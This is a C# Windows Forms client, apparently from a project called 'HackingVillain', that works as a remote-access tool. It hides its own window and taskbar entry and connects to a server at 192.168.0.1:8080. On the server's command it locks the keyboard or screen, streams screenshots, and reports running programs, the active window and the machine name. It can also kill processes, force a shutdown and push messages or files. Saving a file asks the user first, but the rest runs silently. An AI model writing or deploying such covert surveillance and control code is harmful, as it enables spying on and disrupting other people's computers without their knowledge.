using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AwesomeSockets.Buffers;
using AwesomeSockets.Sockets;
using AwesomeSockets.Domain.Sockets;
using NetworkData;

using Buffer = AwesomeSockets.Buffers.Buffer;
namespace HackingVillain
{
    public partial class Client : Form
    {
        ISocket _client;
        Hooker _hook;
        LockForm _lock;
        Thread _listen;
        ScreenMonitor _monitor;
        string _lastFileName = "";
        public Client()
        {
            InitializeComponent();
            _client = AweSock.TcpConnect("192.168.0.1", 8080);
            _hook = new Hooker(_client);
            _monitor = new ScreenMonitor(_client);
            _lock = new LockForm(_hook);

            _listen = new Thread(() =>
            {
                while (true)
                {
                    Listen();
                    Thread.Sleep(1000);
                }
            });

            _listen.Start();

            this.FormBorderStyle = FormBorderStyle.None;
            this.Size = new System.Drawing.Size(0, 0);
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
        }

        ~Client()
        {
            _hook.Dispose();
            _client.Close();
        }

        public static void Send(ISocket client, byte[] msg, int dataType)
        {
            Buffer b = Buffer.New();
            var datas = Data.SplitToDatas(msg, dataType);
            foreach (var dd in datas)
            {
                Buffer.Add(b, dd.Serialize());
                Buffer.FinalizeBuffer(b);
                client.SendMessage(b);
            }
        }

        public void Send(string msg, int dataType = 0)
        {
            Send(_client, Encoding.UTF8.GetBytes(msg), dataType);
        }

        Dictionary<int, List<Data>> _dataBuffer = new Dictionary<int, List<Data>>();
        public void Listen()
        {
            Buffer inBuf = Buffer.New();
            AweSock.ReceiveMessage(_client, inBuf);
            Buffer.FinalizeBuffer(inBuf);
            var data = Data.Deserialize(Buffer.GetBuffer(inBuf));
            if (_dataBuffer.ContainsKey(data.DataType))
                _dataBuffer[data.DataType].Add(data);
            else
                _dataBuffer.Add(data.DataType, new List<Data>() { data });

            if (!data.IsSplited || data.MaxIndex == data.CurrentIndex)
            {
                Got(data.DataType);
            }
            Thread.Sleep(10);
        }

        void Got(int type)
        {
            Got(Data.Combine(_dataBuffer[type]), type);
            _dataBuffer[type].Clear();
        }

        void Got(byte[] bytes, int type)
        {
            if (type == 0)
            {
                string data = Encoding.UTF8.GetString(bytes);
                data = data.TrimEnd('\0');
                if (data == "Lock Key")
                {
                    _hook.Lock();
                }
                else if (data == "UnLock Key")
                {
                    _hook.UnLock();
                }
                else if (data == "Lock Screen")
                {
                    _lock.Show();
                }
                else if (data == "UnLock Screen")
                {
                    _lock.Fuck();
                }
                else if (data == "Show Me The Process")
                {
                    var processes = from p in Process.GetProcesses()
                                    where p.MainWindowTitle.Length > 0
                                    select p.ProcessName;
                    Send(string.Join("\n", processes), 1);
                }
                else if (data == "Show Me The Screen")
                {
                    _monitor.Start();
                    //ScreenMonitor.SendScreen(_client);
                }
                else if (data == "Stop Showing")
                {
                    _monitor.Stop();
                }
                else if (data == "Info")
                {
                    Send((ForegroundWindow.GetActiveWindowTitle() ?? "")
                        + "\n" + System.Environment.MachineName, 2);
                }
                else if (data.StartsWith("Kill"))
                {
                    string name = data.Substring(5);
                    try
                    {
                        Process.GetProcessesByName(name)[0].Kill();
                    }
                    catch
                    {

                    }
                }
                else if (data == "Shutdown")
                {
                    try
                    {
                        Process.Start("shutdown", "/s /t 0");
                    }
                    catch
                    {

                    }
                }
                else if (data.StartsWith("Message"))
                {
                    string msg = data.Substring(8);
                    MessageBox.Show(msg, "서버로부터 메시지");
                }
                else if (data.StartsWith("File"))
                {
                    string info = data.Substring(5);
                    string name = info.Split('\n')[0];
                    string size = info.Split('\n')[1];
                    _lastFileName = name;
                    if (MessageBox.Show($"파일 {name} ({size}) 다운로드를 허락하시겠습니까?", "서버로부터 파일 승인", MessageBoxButtons.YesNo) == DialogResult.Yes)
                        Send("File Accept", 8);
                }
            }
            else if (type == 1)
            {
                this.Invoke(new MethodInvoker(() =>
                {
                    var dialog = new SaveFileDialog();
                    dialog.FileName = _lastFileName;
                    if (dialog.ShowDialog() == DialogResult.OK)
                    {
                        System.IO.File.WriteAllBytes(dialog.FileName, bytes);
                    }
                }));
            }
        }
    }
}
